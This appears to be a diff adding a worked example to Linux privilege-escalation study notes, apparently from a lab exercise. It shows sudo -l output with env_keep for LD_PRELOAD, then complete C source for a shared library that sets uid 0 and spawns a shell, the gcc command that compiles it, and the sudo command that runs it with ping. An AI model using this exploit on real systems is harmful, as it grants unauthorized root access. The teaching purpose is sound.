@@ -17,6 +17,38 @@ The steps of this privilege escalation vector can be summarized as follows;
 3. Run the program with sudo rights and the LD_PRELOAD option pointing to our .so file
 We need to run the program by specifying the LD_PRELOAD option, as follows;
 `sudo LD_PRELOAD=/home/user/ldpreload/shell.so find`
+Example:
+``` shell
+saad@ip-10-201-80-205:~$ sudo -l
+[sudo] password for saad: 
+Matching Defaults entries for saad on ip-10-201-80-205:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, env_keep+=LD_PRELOAD
+
+User saad may run the following commands on ip-10-201-80-205:
+    (root) /usr/bin/ping
+```
+In this example we have user `saad`has the env_keep option for LD_PRELOAD, and can run `/usr/bin/ping` as sudo. To exploit this misconfiguration we can create the share object file that can get us a root shell:
+```c
+#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib.h>
+void _init() {
+    unsetenv("LD_PRELOAD");
+    setgid(0);
+    setuid(0);
+    system("/bin/sh");
+}
+```
+Then we compile this C code into a share library:
+```shell
+gcc -fPIC -shared -o shell.so shell.c -nostartfiles
+```
+Finally, we execute the command by specifying the LD_PRELOAD option:
+```shell
+sudo LD_PRELOAD=/tmp/shell.so /usr/bin/ping
+```
+
 ## SUID
 Much of Linux privilege controls rely on controlling the users and files interactions. This is done with permissions. By now, you know that files can have read, write, and execute permissions. These are given to users within their privilege levels. This changes with SUID (Set-user Identification) and SGID (Set-group Identification). These allow files to be executed with the permission level of the file owner or the group owner, respectively.  
   
